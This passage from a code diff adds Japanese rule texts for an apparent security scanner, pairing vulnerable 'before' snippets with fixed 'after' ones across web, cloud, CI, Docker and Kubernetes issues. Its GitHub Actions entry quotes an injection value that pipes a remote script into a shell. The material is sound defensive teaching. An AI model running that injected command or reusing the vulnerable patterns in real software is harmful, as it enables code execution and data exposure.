+      before: `# .env (間違ってコミットされた)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (コミット対象)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .envはリポジトリに含めない(.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "誰でもすべてのユーザーのデータを読み書きできます",
+    description:
+      "Row Level Securityが無効になっているか、誰がリクエストしているかを確認せずに誰でもアクセスできるポリシー(USING (true))が設定されています。認証済みのユーザー、あるいは匿名のユーザーでさえ、他の全員のデータを読み書きできます。",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "ユーザーが入力した値がデータベースクエリに直接貼り付けられています",
+    description:
+      "SQLクエリが、パラメータを使わず文字列を直接連結または埋め込んで組み立てられています。そのテキストが(間接的にでも)ユーザーから来ている場合、クエリ自体を改変できてしまいます — SQLインジェクション。",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "パスワードが保護されていないようです",
+    description:
+      "パスワードのフィールドがリクエストで届いたそのままの形で保存されており、ファイル内にハッシュ関数(bcrypt、argon2、scrypt)が見当たりません。データベースが侵害されると、すべてのパスワードがすぐに使える状態になります。",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "ログインの署名に使うシークレットがコードに平文で書かれています",
+    description:
+      "jwt.sign / jwt.verifyに渡されるシークレット(またはJWT_SECRET変数)が、環境変数からではなくコード内のリテラル値になっています。それを読んだ人は誰でも、任意のユーザーの有効なアクセストークンを作成できます。",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "サーバーが外部コマンドの実行を強制される可能性があります",
+    description:
+      "システムコマンドを実行する関数(exec、execSync、spawn)が、文字列の埋め込みや連結によって組み立てられた文字列を受け取っています。その文字列の一部がユーザー入力に由来する場合、それを制御する者がサーバー上で任意のコマンドを実行できます。",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "サーバー上のファイルが、外部から選択されたパスで読み書きされる可能性があります",
+    description:
+      "ファイルを読み取り、書き込み、または送信する関数が、許可されたフォルダ内に留まっているかを確認せずに、リクエストの値(query、body、params)からパスを直接取得しています。攻撃者は\"../\"を挿入して想定されたフォルダから抜け出し、サーバー上の任意のファイル(例えば認証情報を含む設定ファイル)を読み書きできます。",
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("許可されていないパスです")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "ユーザーが入力した値が、MongoDBクエリの中でコードとして実行されます",
+    description:
+      "MongoDBの$where演算子は、ドキュメントごとにサーバー側でJavaScriptを実行します — その文字列がユーザーから来た値を連結して組み立てられている場合、それを制御する者は、通常のSQLインジェクションのようにフィルタを変えるだけでなく、データベースのコンテキストで任意のコードを実行させることができます。",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "ユーザーが入力した値が、データとしてではなくテンプレートとして解釈されます",
+    description:
+      "テンプレートをコンパイル/実行する関数が、固定のテンプレートを使ってデータだけを渡すのではなく、リクエストの値からテンプレート全体を受け取っています。攻撃者はテンプレートエンジンの構文(例えばJinja2の{{7*7}})を直接書き込んでサーバー上でコードを実行できます — Server-Side Template Injectionは、XSSのような表示上の問題にとどまらず、任意のコマンド実行につながることがよくあります。",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XMLパーサーがファイルの読み取りや外部へのリクエストを強制される可能性があります",
+    description:
+      "XMLパーサー(DocumentBuilderFactory)が、近くの行で外部エンティティ(DOCTYPE)を明示的に無効化せずに作成されています。パーサーが信頼できないソースからXMLを受け取る場合、攻撃者は外部エンティティを定義して、サーバー上のファイルを読み取らせたり、任意のアドレスに接続させたりできます — XML External Entity。",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Terraformのsecurity groupが、機密性の高いポートをインターネット全体に公開しています",
+    description:
+      '"cidr_blocks"に0.0.0.0/0(任意のIPアドレス)を含むルールが、機密性の高いポート — SSH(22)、RDP(3389)、または典型的なデータベースポート(MySQL、Postgres、MongoDB、Redis、SQL Server) — の近くにあります。インターネット上の誰でも、本来接続すべき人だけでなく、そのサービスへの接続を試みることができます。',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # あなたのプライベートネットワーク、またはbastion hostのみ\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Google Cloudのファイアウォールルールが、機密性の高いポートをインターネット全体に公開しています",
+    description:
+      '"source_ranges"に0.0.0.0/0(任意のIPアドレス)を含む"google_compute_firewall"リソースが、機密性の高いポート — SSH(22)、RDP(3389)、または典型的なデータベースポート(MySQL、Postgres、MongoDB、Redis、SQL Server) — へのトラフィックを許可しています。インターネット上の誰でも、本来接続すべき人だけでなく、そのサービスへの接続を試みることができます。',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # あなたのプライベートネットワーク、またはbastion hostのみ\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Azureのネットワークルールが、機密性の高いポートをインターネット全体に公開しています",
+    description:
+      '"azurerm_network_security_rule"、または"azurerm_network_security_group"内の"security_rule"ブロックで、"source_address_prefix"が"*"または"0.0.0.0/0"、方向が"Inbound"、アクセスが"Allow"に設定され、機密性の高いポート — SSH(22)、RDP(3389)、または典型的なデータベースポート — の近くにあります。インターネット上の誰でも、本来接続すべき人だけでなく、そのサービスへの接続を試みることができます。',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # あなたのプライベートネットワーク、またはbastion hostのみ\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "秘密情報が、Terraform変数のデフォルト値として書かれています",
+    description:
+      '"password"/"secret"/"token"/"key"のような名前の変数が、その"default"にリテラル値を持っています。実行時に渡される値(tfvars、TF_VAR_*環境変数)とは異なり、defaultはソースコードに残ります — リポジトリが共有または公開されている場合、Terraformの状態にアクセスできなくても誰でもそれを見ることができます。',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # defaultは設定しない: .tfvarsファイル(git管理外)またはTF_VAR_db_password環境変数で渡す\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "外部ユーザーが制御する値が、CIのシェルコマンドに直接入り込みます",
+    description:
+      'GitHub Actionsワークフローの"run:"コマンドが、pull requestのタイトル、ブランチ名、コメントのテキストなど、外部のforkからも含め、pull requestやコメントを開ける人なら誰でも書き込める値を直接埋め込んでいます。`"; curl malware.sh | sh #`のような値は、そのワークフローで利用可能なすべてのシークレットにアクセスしながら、CIで任意のコマンドを実行してしまいます。',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # 環境変数として渡す。コマンドに直接埋め込まない`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "ワークフローが、リポジトリのシークレットにアクセスできる状態で外部のpull requestのコードを実行します",
+    description:
+      'ワークフローは"pull_request_target"を使っています — これは無関係なforkから開かれたpull requestに対しても、ベースリポジトリの権限とシークレットで実行されます — そして、ベースブランチではなくpull request自体のコード("github.event.pull_request.head")をチェックアウトします。pull requestを開いた人は、事実上、それらのシークレットにアクセスできる状態で自分のコードを実行させることになります。',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # PRのコードではなくベースブランチをチェックアウトする — あるいは、より広い\n      # 権限/シークレットが不要なら"pull_request_target"の代わりに\n      # "pull_request"を使う。\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "リクエストデータが、コードを実行できる形式でデシリアライズされています",
+    description:
+      "pickle(Python)、unserialize()(PHP)、ObjectInputStream(Java)、またはnode-serializeライブラリ(Node)が、リクエストから直接取得した値をデシリアライズしています。JSONとは異なり、これらの形式はデシリアライズそのものの過程でコードを表現・実行できます — 送信される値を制御する者は、サーバー上で任意のコード実行を達成できます。",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSONはパース時にコードを実行しない(pickleとは異なる)`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'コードが、署名のないJWTトークン("none"アルゴリズム)を明示的に受け入れています',
+    description:
+      'JWTトークンを検証する際に受け入れるアルゴリズムに"none"が含まれています。"none"アルゴリズムのトークンには検証すべき署名が一切ありません。誰でも任意の内容(例えば管理者ロール)でトークンを作成でき、コードはそれを有効なものとして受け入れてしまいます。',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // 受け入れるアルゴリズムに"none"を含めない`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "新しいテーブルが保護なしで作成されているようです",
+    description:
+      "SQLマイグレーションでテーブルが作成されていますが、同じファイル内でそのテーブルのRow Level Securityが有効化されていません。この状態が続く限り、そのテーブルは誰でも読み書きできる制限なしの状態で生まれます。",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "サイトが他のどのWebサイトからのリクエストも受け入れています",
+    description:
+      "CORSヘッダーがすべてのオリジン(*)からのリクエストを受け入れるよう設定されているか、cors()ミドルウェアが制限なしで使われています。どのサードパーティのWebサイトも、既に認証済みのユーザーのブラウザからあなたのAPIを呼び出せます。",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "管理者権限を持つ関数が、誰が使っているかを確認していません",
+    description:
+      "名前から管理者向けの操作だとわかるルートや関数に、近くの行に認証チェックやロールチェックが一切ありません。そのURLを知っている人なら誰でも実行できてしまいます。",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "サイトが外部コードの実行を強制される可能性があります",
+    description:
+      "送信するHTTPリクエスト(fetch、axios)が、ユーザーのリクエストから来た値を送信先URLとして直接使っています。悪意のあるユーザーは、あなたのサーバーに内部アドレスや任意のアドレスを呼び出させることができます — Server-Side Request Forgery。",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("許可されていないURLです")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "パスワードが、今では簡単に破られる方法で保護されています",
+    description:
+      "同じ行で、パスワードに関連する値にmd5()やsha1()が適用されています。これらのアルゴリズムは計算が速すぎます。データベースを持つ攻撃者は1秒間に数十億のパスワードを試すことができます。",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "xss-dangerous-html": {
+    title: "ユーザーが書いたテキストがブラウザでコードを実行する可能性があります",
+    description:
+      "コンテンツが、プレーンテキストとしてではなく、生のHTML(dangerouslySetInnerHTML、v-html、.innerHTML)としてページに挿入されています。そのコンテンツにユーザー入力が含まれる場合、ページを読む人のブラウザで実行されるスクリプトを含められてしまいます。",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// もしHTMLが必要な場合: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "アップロードされたファイルの保存領域が誰からでも見える状態です",
+    description:
+      "ストレージバケット(Supabase Storage、S3)がpublicとして設定されています。ユーザーがアップロードしたドキュメント、写真、ファイルが含まれる場合、そのパスを知っている — または推測できる — 誰でも、認証なしでアクセスできます。",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// 有効期限付きの署名付きURLでファイルを配信する: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "リンク1つでデータの削除や変更が可能です",
+    description:
+      "GETルートがデータを変更する操作を行っています(パスにdelete/remove/update/editが含まれる)。GETリクエストはリンクを訪問したり、外部サイトから画像を読み込んだりするだけで実行されます — CSRF攻撃の典型的な足がかりです。",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "ブラウザに保存されたログイン情報がうまく保護されていません",
+    description:
+      "アクセストークンがlocalStorageに保存されています。httpOnlyクッキーとは異なり、ページ上で実行されるどんなスクリプト(XSS経由で注入された悪意のあるものも含む)もそれを読み取り、盗むことができます。",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// サーバー側でトークンをhttpOnlyクッキーとして設定する:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "サイトが詐欺サイトへのリダイレクトに使われる可能性があります",
+    description:
+      "サイトが、既知のドメインかどうかを確認せずに、リクエスト(query、body、params)から直接取得したアドレスにユーザーをリダイレクトしています。あなたのサイトを指しているように見えるリンクが、実際にはフィッシングページにつながる可能性があります。",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "アドレス内の数字を変えるだけで、他人のデータが見える可能性があります",
+    description:
+      "データベースクエリが、リクエストしているユーザーに属しているかを近くの行で確認せずに、URLから取得した識別子(req.params.id)を直接使っています。アドレス内のidを変えるだけで、別のユーザーのデータにアクセスできる可能性があります — Insecure Direct Object Reference。",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "ログインフォームが連続した試行回数を制限していません",
+    description:
+      "ログインルートがファイル内で定義されていますが、同じファイル内にレート制限ミドルウェアの形跡がありません。試行回数に制限がないと、攻撃者は速度を落とされることなくパスワードを連続して試す(ブルートフォース)ことができます。",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "パスワードや機密データがログに記録されています",
+    description:
+      "console.log(または類似のもの)の呼び出しに、password、token、secret、apiKeyという名前の変数が含まれています。これらのログが外部サービスやファイルに残ると、機密データが必要以上に長く露出したままになります。",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Terraformで定義されたS3バケットでBlock Public Accessが無効になっています",
+    description:
+      '"aws_s3_bucket_public_access_block"の4つの保護(block_public_acls、ignore_public_acls、block_public_policy、restrict_public_buckets)のうち1つ以上がfalseに設定されています。バケットが既に公開されているという意味ではありませんが、将来誤って公開されるのを防ぐセーフティネットが外れている状態です。',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Terraformで定義されたIAMポリシーがフルアクセスを許可しています",
+    description:
+      'アクション"*"とリソース"*"を持つstatementは、すべてのAWSサービスとリソースへのフルアクセスを許可します — 既にライブのIAM状態に対して行われているのと同じチェックを、ここではそれが適用される前のコードから直接読み取っています。緊急時用のロールとして意図されている可能性もありますが、確認が必要です。日常的な用途では、本当に必要な権限だけを与えてください。',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "Google Cloud Storageバケットが誰でも読み取れる状態になっています",
+    description:
+      '"google_storage_bucket_iam_member"または"google_storage_bucket_iam_binding"リソースが、"allUsers"または"allAuthenticatedUsers"にロールを付与しています。前者はGoogleアカウントなしでインターネット上の誰でもバケットを読み取れるようにし、後者はアクセスすべきでない人も含め、何らかのGoogleアカウントを持つ誰でも読み取れるようにします。',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # 本当にアクセスすべき人だけにする(allUsers/allAuthenticatedUsersではなく)\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Azureストレージアカウントでpublic blob accessが有効になっています",
+    description:
+      '"azurerm_storage_account"で"allow_blob_public_access"がtrueに設定されています。公開されたblob/コンテナのURLを知っている人は誰でも、認証なしでそれを読み取れます。',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "Google Cloud IAMロールがフルアクセス(Owner/Editor)を許可しています",
+    description:
+      '"google_project_iam_binding"/"google_project_iam_member"(または組織/フォルダレベルの同等のもの)が、プリミティブロールの"roles/owner"または"roles/editor"を割り当てています — プロジェクト内のほぼすべてのサービスへのほぼフルアクセスです。緊急用アカウントとして意図されている可能性もありますが、確認が必要です。日常的な用途では、本当に必要なより具体的な定義済みロールだけを与えてください。',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # 本当に必要な定義済みロールだけにする(roles/ownerではなく)\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Azureのロール割り当てがフルアクセス(Owner)を許可しています",
+    description:
+      '"azurerm_role_assignment"が"Owner"ロールを割り当てています — 割り当てられたスコープ全体(サブスクリプション、リソースグループなど)に対する、他のユーザーの権限の制御を含むフルアクセスです。緊急用アカウントとして意図されている可能性もありますが、確認が必要です。日常的な用途では、本当に必要なより具体的なロール(例えば単一のリソースグループに対する"Contributor")だけを与えてください。',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # 本当に必要なより具体的なロールだけにする(サブスクリプション全体へのOwnerではなく)\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "セキュリティトークンが、暗号学的に安全でない乱数生成器で生成されています",
+    description:
+      "token/session/reset/otp/csrfのような名前の値が、Math.random()(JS)、random.random()(Python)、またはrand()(PHP)で生成されています — これらはセキュリティ用に設計されておらず、その系列は予測可能です。このように生成されたトークンは推測または再構築される可能性があり、それが存在する目的(例えば誰でも予測できてしまうパスワードリセットリンク)を無効にしてしまいます。",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto。Math.randomではない — 予測不可能`,
+    },
+  },
+  "ldap-injection": {
+    title: "LDAPフィルタが、リクエストの値を直接連結して組み立てられています",
+    description:
+      'LDAPフィルタ(例: "(uid=...)")を組み立てる行が、LDAPの特殊文字を一切エスケープせずに、リクエストから取得した値を直接含んでいます。その値を制御する者は、フィルタのロジックを改変できます — 例えば認証チェックを回避したり、見るべきでないディレクトリデータを読み取ったりできます。',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // LDAPの特殊文字はフィルタで使う前に必ずエスケープすること\nclient.search(base, { filter });",
+    },
+  },
+  "header-injection": {
+    title: "リクエストの値がHTTPレスポンスヘッダーに直接入り込みます",
+    description:
+      "HTTPレスポンスヘッダーが、改行(CRLF)を含んでいないか確認せずに、リクエスト(query、body、params)から直接取得した値で設定されています。攻撃者は追加のヘッダー、あるいはまったく別のレスポンス全体を挿入できます — response splitting — これによりキャッシュ、クッキー、他のユーザーに表示される内容を操作できる可能性があります。",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "CIのサードパーティアクションが、正確なバージョン(コミットSHA)に固定されていません",
+    description:
+      'ワークフローが、コミットSHAではなくタグやブランチ(例: "@v1"、"@main")で参照されたサードパーティアクションを使っています。それを管理する人 — あるいはそのアカウントを侵害した人 — は、その参照をいつでも別のコミットに移動でき、CIで実行される内容をそのシークレットへのアクセスとともに密かに変更できます。コミットSHAは常にまったく同じコードを指します。',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1。コミットSHAに固定 — バージョンを更新するときはSHAも更新する`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "ワークフローが、使用する権限だけでなくトークンのすべての権限を自身に付与しています",
+    description:
+      '"permissions: write-all"は、ワークフローの一部しか使っていなくても、issue、pull request、パッケージ、デプロイメントなど、ワークフローのGITHUB_TOKENにすべてへの書き込みアクセスを付与します。ワークフローのあるステップが侵害された場合(悪意のある依存関係、注入されたスクリプト)、その広い権限は悪用する側ができることを増やします。',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # ワークフローが実際に使う権限だけ`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "セッションまたは認証クッキーがSecureとHttpOnlyフラグなしで設定されています",
+    description:
+      'session/auth/tokenに似た名前のクッキーが、オプションに"httpOnly"と"secure"を含めずに設定されています。httpOnlyがないと、ページ上のJavaScript — XSS経由で注入されたものも含む — がそのクッキーを読み取れます。secureがないと、暗号化されていないHTTP接続でも送信される可能性があります。',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "脆弱な依存関係:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "まだ修正済みバージョンは判明していません — 代替パッケージの検討か、プロジェクトの更新状況を追ってください。"
+      ),
+    },
+  }),
+  "docker-hardcoded-secret": {
+    title: "DockerfileのENVまたはARG命令に、秘密情報が直接書かれています",
+    description:
+      "password/secret/token/keyのような名前の変数が、ENVまたはARG命令にリテラル値を持っています。通常イメージに含まれない.envファイルとは異なり、この値はDockerイメージ自体に焼き込まれます — pullしたりレイヤー履歴を調査したりできる人なら誰でもそれを復元できます。Dockerfileの後のバージョンでその行を削除しても同様です。",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# 渡し方: docker build --build-arg DB_PASSWORD=*** (あるいは、より良い方法として\n# レイヤー履歴に残らないBuildKitのsecret mountを使う)`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfileでnon-rootユーザーが設定されていません",
+    description:
+      "Dockerfile内にUSER命令がありません。指定しない場合、コンテナはrootとして実行されます。攻撃者がコンテナ内でコードを実行できた場合(例えば脆弱なライブラリを悪用して)、コンテナ内でrootであることは、ホストへの脱出や周辺システムへのより広い影響を容易にします。",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Dockerfileのベースイメージが":latest"タグを使っています',
+    description:
+      '"FROM"命令が、正確なバージョンではなく明示的に":latest"タグを使っています。"latest"は時間とともに変化します。同じビルドを別のタイミングでやり直すと、ベースイメージの異なるバージョンを取得する可能性があります — 再現性のないビルドであり、誰も決めていないのに望まない更新が入り込む可能性があります。',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "DockerfileがCOPYではなくADDでリモートファイルをダウンロードしています",
+    description:
+      "http/https URLを持つADD命令が、整合性チェックなしで、かつリポジトリ内でその内容が見えない状態で、ビルド中にインターネットからファイルをダウンロードします。そのURLが将来侵害された場合、ビルドはDockerfileを読んだだけでは誰も気づかないまま任意のコンテンツを取り込んでしまいます。",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<期待されるハッシュ>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Kubernetesマニフェストのコンテナがprivilegedとして実行されています",
+    description:
+      'コンテナのsecurityContextの"privileged: true"は、コンテナとホストの間の通常の分離のほぼすべてを無効にします。コンテナはホストのデバイスにアクセスしたり、ネットワーク設定を変更したり、多くの場合それを実行しているマシン上で事実上root権限を得たりできます。通常のアプリではほとんど必要ありません。',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # 本当に必要なcapabilityだけ`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Kubernetesマニフェストのenv変数に、秘密情報が平文で書かれています",
+    description:
+      '"password"/"secret"/"token"/"key"のような名前の環境変数が、Secret("valueFrom.secretKeyRef")から読み取るのではなく、リテラル値("value:")を持っています。そのためマニフェスト自体 — しばしばリポジトリにコミットされる — に秘密情報が平文で含まれることになり、クラスターでコマンドを実行できなくても設定を読めるだけの人にも見えてしまいます。',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "k8s-run-as-root": {
